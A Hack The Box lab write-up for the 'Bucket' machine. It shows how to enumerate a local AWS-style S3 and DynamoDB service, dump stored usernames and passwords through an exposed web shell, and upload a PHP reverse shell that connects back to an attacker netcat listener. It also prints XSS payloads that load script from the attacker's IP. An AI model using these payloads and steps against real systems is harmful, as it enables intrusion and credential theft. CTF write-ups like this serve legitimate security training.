# Website

Visiting `http://10.10.10.212` redirects to `http://bucket.htb`. So let's add that to our hosts file:

```bash
┌──(mac㉿kali)-[~/Documents/enum]
└─$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kali
10.10.10.212    bucket.htb
```

We see this bug bounty website:

![[Pasted image 20210428122533.png]]

Looking at the source with `Ctrl + U`, we see the page's images are being requested from the domain `s3.bucket.htb`:

![[Pasted image 20210428122741.png]]

So we can add this to our hosts too, and visit the URL:

```bash
┌──(mac㉿kali)-[~/Documents/enum]
└─$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kali
10.10.10.212    bucket.htb s3.bucket.htb
```

## s3.bucket.htb

We simply see the message '{"status": "running"}':

![[Pasted image 20210428122851.png]]

Running [[Writeups/Hack the Box/Boxes/Bucket/5 - Enumeration#s3 bucket htb|gobuster]] against the `s3` subdomain reveals the `/health` and `/shell` pages.

### Health Page

First, let's check `http://s3.bucket.htb/health`:

![[Pasted image 20210428123940.png]]

This reveals a second service is running, strongly suggesting this box is related to Amazon Web Services (AWS). S3 is a storage service for AWS, and DynamoDB is a NoSQL-based database service.

Seeing that DynamoDB (DDB) was another service running, I wondered if there was an equivalent subdomain. I tried a number of subdomains to see if I could get a URL that corresponds to DDB:

```bash
┌──(mac㉿kali)-[~/Documents/enum]
└─$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kali
10.10.10.212    bucket.htb s3.bucket.htb dynamodb.bucket.htb db.bucket.htb ddb.bucket.htb dynamo.bucket.htb
```

However, all of these just resolved back to the main site.

### Shell Page

Navigating to `http://s3.bucket.htb/shell` redirects to a strange URL:

![[Pasted image 20210428124114.png]]

I ran this request through Burp to see what was happening:

```
HTTP/1.1 200  
Date: Tue, 15 Dec 2020 15:26:03 GMT  
Server: hypercorn-h11  
content-type: text/html; charset=utf-8  
content-length: 0  
refresh: 0; url=http://444af250749d:4566/shell/
access-control-allow-origin: \*  
access-control-allow-methods: HEAD,GET,PUT,POST,DELETE,OPTIONS,PATCH  
access-control-allow-headers: authorization,content-type,content-md5,cache-control,x-amz-content-sha256,x-amz-date,x-amz-security-token,x-amz-user-agent,x-amz-target,x-amz-acl,x-amz-version-id,x-localstack-target,x-amz-tagging  
access-control-expose-headers: x-amz-version-id  
Connection: close
```

It allows POST requests, so I tried a couple of basic requests to see if I could execute Unix commands.

```bash
┌──(mac㉿kali)-[~/Documents/enum]
└─$ curl -d 'cmd=id' http://s3.bucket.htb/shell
```

This returned nothing.

Then I noticed the `/` at the end of the `http://444af250749d:4566/shell/` URL. I tried appending this to the `s3` URL, and got a result:

![[Pasted image 20210428124724.png]]

This seems to be a shell for interacting with DDB.

I did a lot of experimenting with the features on this page. I'll give a quick overview of what I tried rather than jumping straight to what worked. I'm hoping to do this in all of my writeups, so you can see my approach and methodology; but I don't want failed attempts to bog down my writeups, so I'll exclude syntax errors and always include a link to the [[Writeups/Hack the Box/Boxes/Bucket/10 - Website#Exfiltrating Data|working exploit]] if you want to skip ahead.

**Attempting to Upload a Shell**

Clicking the 'save' icon seems to allow uploading a file:

![[Pasted image 20210428130221.png]]

I downloaded a [javascript shell](https://github.com/shelld3v/JSshell) from GitHub and attempted to upload one:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket/js-shell/JSshell]
└─$ python3 jsh.py -s 10.10.14.92 -g
    __              
  |(_  _ |_  _  |  |
\_|__)_> | |(/_ |  |
                      v3.1

Payloads:  
 - SVG: <svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//10.10.14.92:4848"},1010)>
 - SCRIPT: <script>setInterval(function(){with(document)body.appendChild(createElement("script")).src="//10.10.14.92:4848"},1010)</script>
 - IMG: <img src=x onerror=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//10.10.14.92:4848"},1010)>
 - BODY: <body onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//10.10.14.92:4848"}></body>

Listening on [any] 4848 for incoming JS shell ...

```

I used the `<script>setInterval(function(){with(document)body.appendChild(createElement("script")).src="//10.10.14.92:4848"},1010)</script>` payload, and saved this to a file named `pld` before uploading it.

I then tried to hit the shell by visiting `http://s3.bucket.htb/pld`, but got no response back. I could have spent some time looking for an upload location, but had a feeling that this wasn't the correct way to go, so I moved on.

I had to use the `kill` command to close the listener using its PID, as it was unresponsive to `Ctrl + C`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket/js-shell/JSshell]
└─$ ps aux | grep jsh.py
mac         4790  0.1  1.4  30140 22096 pts/5    S+   13:03   0:00 python3 jsh.py -s 10.10.14.92 -g
┌──(mac㉿kali)-[~/Documents/HTB/bucket/js-shell/JSshell]
└─$ kill -9 4790
```

**Looking for Useful SDK Functions**

I started trying to write some code using the Javascript SDK. I ran into a few issues, as it wasn't as well documented as other SDKs, but I started out with a simple attempt at listing the Dynamo Tables:

```javascript
var dynamodb = new AWS.DynamoDB();  
var param = {};  
dynamodb.listTables(param, function (err, data) {  
	if (err) console.log(err, err.stack); // an error occurred  
	else console.log(data); // successful response  
});
```

This code can be executed directly in the browser, as shown:

![[Pasted image 20210428131851.png]]

I received the following response:

```
{"message":"The security token included in the request is invalid.","code":"UnrecognizedClientException"}
```

I tried configuring AWS STS to get a session token, as per [the STS docs](https://docs.aws.amazon.com/AWSJavaScriptSDK/latest/AWS/STS.html#getSessionToken-property):

```javascript
var dynamodb = new AWS.DynamoDB();  
var sts = new AWS.STS();
sts.getSessionToken(function(err, data) {
  if (err) console.log(err, err.stack); // an error occurred
  else     console.log(data);           // successful response
});
var param = {};  
dynamodb.listTables(param, function (err, data) {  
	if (err) console.log(err, err.stack); // an error occurred  
	else console.log(data); // successful response  
});
```

This gave me the following error:

```
{"message":"Cannot load XML parser","code":"XMLParserError"
```

At this point I wasn't sure exactly *how* the AWS environment was configured, as it seemed local to the box. I wondered if it did actually use IAM and secret access keys for authentication, like normal AWS, or if there was something else going on. I would only figure this out after gaining a foothold on the box.

I spent a *long* time trying to debug the `XMLParserError`, which popped up in a large number of contexts, especially later on when interacting with S3. It was a badly documented error, and the most definitive answer I found was [this post](https://forums.aws.amazon.com/thread.jspa?messageID=488946) suggesting it is a bug in the configuration itself. Eventually I moved on and switched up my approach.

#### Exfiltrating Data

I suspected that there was some sort of local AWS setup powering the website, perhaps with a minimal number of services. So I did some googling around local deployments and tried to avoid official AWS docs as they interact with services that might not exist locally.

I found this [Stack Overflow Post](https://stackoverflow.com/questions/57988963/how-to-access-dynamodb-local-using-dynamodb-javascript-shell) which suggests using an 'endpoint URL' to access local resources.

I initially tried `http://bucket.htb` as the endpoint URL, as I figured it was the most generic domain. However, this gave me the following error:

```
{"message":"Network Failure","code":"NetworkingError","time":"2020-12-15T16:25:33.070Z","region":"us-west-2","hostname":"bucket.htb","retryable":true}
```

So I switched to this code, using `http://s3.bucket.htb` instead:

```javascript
var dynamodb = new AWS.DynamoDB({endpoint: '[http://s3.bucket.htb'](http://s3.bucket.htb') });  
var param = {};  
dynamodb.listTables(param, function (err, data) {  
if (err) console.log(err, err.stack); // an error occurred  
else console.log(data); // successful response  
});
```

This lets us enumerate the tables in the database!

![[Pasted image 20210428134850.png]]

Now we can scan the table. I used this code:

```javascript
var dynamodb = new AWS.DynamoDB({endpoint: 'http://s3.bucket.htb' });
var param = {
    TableName: 'users',
    Limit: 10
};
dynamodb.scan(param, function(err, data) {
    if (err) ppJson(err); // an error occurred
    else console.log(data); // successful response
});
```

Which outputted some usernames and passwords! I took note of these in [[Writeups/Hack the Box/Boxes/Bucket/1 - Loot|Loot]]

![[Pasted image 20210428135105.png]]

We don't have anywhere to use these creds right now. So I figured the next step was to try and attack the S3 Bucket instead.

### Attacking the Bucket

I wondered if the credentials were for the AWS CLI. I installed it with:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket]
└─$ sudo apt install awscli
```

I will again briefly detail my thought process here, but you can skip to the [[Writeups/Hack the Box/Boxes/Bucket/10 - Website#Uploading a Web Shell|working solution]] if you like.

I then tried a basic S3 command to upload a small `.html` file to the bucket and see if I could hit it.

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket]
└─$ aws s3 cp ello.html http://s3.bucket.htb

usage: aws s3 cp <LocalPath> <S3Uri> or <S3Uri> <LocalPath> or <S3Uri> <S3Uri>
Error: Invalid argument type
```

I assumed this error was because I had the incorrect bucket name. I didn't immediately know how to fix it, so I went back to the shell to see if I could enumerate some more.

#### Using the Shell Page to Hit S3

I tried to use the shell to interact with S3 and enumerate it - it is a Javascript SDK, so its functionality shouldn't be limited to DDB in theory.

I started with trying to list buckets, using the [endpoint URL](https://docs.aws.amazon.com/AWSJavaScriptSDK/latest/AWS/S3.html#endpoint-property) docs again:

```javascript
var s3 = new AWS.S3({endpoint: 'http://s3.bucket.htb' });
var params = {};
 s3.listBuckets(params, function(err, data) {
   if (err) console.log(err, err.stack); // an error occurred
   else     console.log(data);           // successful response
 });
```

This gave me the `XMLParserError`, which would continue to be a running theme with the shell. I tried a number of different encodings, as well as using `ppJson()` to parse the response, but none of these solutions worked.

I tried instead to [put an object](https://docs.aws.amazon.com/AWSJavaScriptSDK/latest/AWS/S3.html#putObject-property) to the bucket. This method required a Bucket Name parameter. Looking at the website source again, the images make a reference to `adserver`, which I thought could be the bucket name.

After some experimenting, I eventually got the server to respond by setting the `Bucket` property to simply `s3`:

```javascript
var s3 = new AWS.S3({endpoint: 'http://s3.bucket.htb', params: { Bucket: "s3" } });
 s3.listObjects({ Delimiter: "/" }, function(err, data) {
    if (err) {
      return console.log(err);
    } else {
        return console.log(data);
    }
 });
```

But this returned *yet another* `XMLParserError`. At this point, I switched to getting the CLI to work. However, I've included these functions in the writeup just for reference and to explain how I came to the eventual solution.

#### Using the AWS CLI

I tried again, adjusting the URL slightly to fit with the format of AWS references in other examples:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket]
└─$ aws s3 cp ello.html s3://s3.bucket.htb
upload failed: ./ello.html to s3://s3.bucket.htb/ello.html Unable to locate credentials
```

Progress! I ran `aws configure` to set some credentials. I initially tried with empty credentials.

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket]
└─$ aws configure
AWS Access Key ID [None]:
AWS Secret Access Key [None]:
Default region name [None]: us-west-1
Default output format [None]: json
┌──(mac㉿kali)-[~/Documents/HTB/bucket]
└─$ aws s3 cp ello.html s3://s3.bucket.htb
upload failed: ./ello.html to s3://s3.bucket.htb/ello.html An error occurred (InvalidAccessKeyId) when calling the PutObject operation: The AWS Access Key Id you provided does not exist in our records.
```

There was still a problem with our code, and it was missing one key component. After some prompting to think about an option that might mean the request no longer requires credentials, I remembered about the 'Endpoint URL' parameter in the shell.

I set the equivalent CLI parameter, `--endpoint-url`. With empty creds I got a credential error again, but after setting some arbitrary credentials we got a hit!

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket]
└─$ aws configure
AWS Access Key ID [None]: arbitrary
AWS Secret Access Key [None]: arbitrary
Default region name [us-west-1]:
Default output format [json]:
┌──(mac㉿kali)-[~/Documents/HTB/bucket]
└─$ aws s3 ls --endpoint-url http://s3.bucket.htb
2021-04-28 14:41:03 adserver
```

We can now upload a test file to the adserver directory, and visit it in the browser:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket/uploads]
└─$ aws s3 cp test.txt s3://adserver/images/test.txt --endpoint-url http://s3.bucket.htb
upload: ./test.txt to s3://adserver/images/test.txt
```

![[Pasted image 20210428143658.png]]

Awesome!

Now we can try a PHP shell. I tried the shell located at `/usr/share/webshells/php/php-reverse-shell.php`, uploading it with `aws s3 cp phprs.php s3://adserver/images/test.php --endpoint-url http://s3.bucket.htb` and then visiting `http://s3.bucket.htb/adserver/images/test.php`

I didn't get a hit to my listener. I tried a few payloads here, including a `.html` file with a `<?php ?>` section, which revealed that PHP was not being rendered on the page.

I then tried an alternative Javascript web shell, downloaded from [https://gist.github.com/substack/7349970](https://gist.github.com/substack/7349970). However, this also didn't work.

I figured that perhaps I needed to upload to the `s3` subdomain, and then trigger the payload on the main URL. I considered a few things:
- somehow specifying two endpoints, one being the `bucket.htb` domain and the other being the `s3` subdomain
- overwriting one of the images on the adserver bucket with a malicious png
- trying to trigger the shell on the `bucket.htb` domain, by visiting `http://    bucket.htb/adserver/malicious-file`
- trying different methods of accessing the shell, such as `curl`, in case some strange browser behaviour was preventing it from being triggered

However, the answer turned out to be much simpler. I was just uploading to the wrong location on the bucket, revealed by simply listing its contents:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket/uploads]
└─$ aws --endpoint-url http://s3.bucket.htb s3 ls
2020-12-18 19:16:03 adserver
┌──(mac㉿kali)-[~/Documents/HTB/bucket/uploads]
└─$ aws --endpoint-url http://s3.bucket.htb s3 ls adserver
                           PRE images/
2020-12-18 19:16:04       5344 index.html
```

The webserver is hosted out of the `adserver` directory on the bucket (which makes sense with hindsight). This essentially means files at `http://s3.bucket.htb/adserver/directory/file` are mapped to `http://bucket.htb/directory/file` on the main website.

Strangely, visiting `http://bucket.htb/images/malware.png` returns an error, which is what originally threw me off and led me down a rabbit hole.

![[Pasted image 20210428154235.png]]

It is possible that only files in the top level directory are accessible this way - but either way, we now know what to do!

#### Uploading a Web Shell

So, the command to upload a shell is simply:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket/uploads]
└─$ aws s3 cp phprs.php s3://adserver/ --endpoint-url http://s3.bucket.htb 
upload: ./phprs.php to s3://adserver/phprs.php
```

Then we execute the shell by starting a netcat listener and visiting the URL:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket/uploads]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.65] from (UNKNOWN) [10.10.10.212] 42766
Linux bucket 5.4.0-48-generic #52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 08:58:18 up  4:38,  0 users,  load average: 0.12, 0.04, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

This can be a bit temperamental - sometimes requesting the shell at `http://bucket.htb/phprs.php` returns a 404 status code. However, you just need to keep trying until it works. To check your shell has actually uploaded, you can use `s3 ls`, and copy and paste the filename just to be sure:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket/uploads]
└─$ aws s3 ls adserver --endpoint-url http://s3.bucket.htb
                           PRE images/
2021-04-29 09:57:04       5344 index.html
2021-04-29 09:57:47       5492 phprs.php
```